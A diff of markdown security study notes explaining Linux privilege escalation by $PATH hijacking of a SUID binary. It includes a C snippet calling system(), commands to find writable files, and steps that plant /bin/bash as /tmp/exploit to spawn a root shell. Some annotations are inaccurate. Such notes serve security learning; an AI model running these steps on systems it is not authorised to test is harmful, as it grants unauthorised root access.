@@ -52,15 +52,13 @@ Complie this text as a shared extension
 ## $Path
 Use **echo $PATH** 
 
-**$PATH** escalation occurs when a high privilege executable like a SUID binary calls a system command e.g ls, cat, echo using a relative path rather than an absolute path e.g bin/ls
+**$PATH** escalation occurs when a high privilege executable like a SUID binary calls a system command e.g ls, cat, echo using a relative path rather than an absolute path e.g bin/ls. Linux $PATH looks through files left to right.
 
 **find / -writable 2>/dev/null** find writeable files. 
 
 **find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u** to hide running related proccesses. 
 
-**which**  to check the path of the command.
-
-**Path.c**
+**path.c**
 ```
 #include<unistd.h>
 void main()
@@ -69,11 +67,13 @@ void main()
   system("exploit");
 }
 ```
-* gcc path.c -o path -w
-* chmod u+s path
-* export path=/tmp:$PATH
-* exploit
-
+* gcc path.c -o path -w *Complies code*
+* chmod u+s path *Changes file permissions*
+* export PATH=/tmp:$PATH *Creates a file in $PATH*
+* echo "/bin/bash" > /tmp/exploit
+* chmod 777 /tmp/exploit
+* ./path
+ 
 
 
 
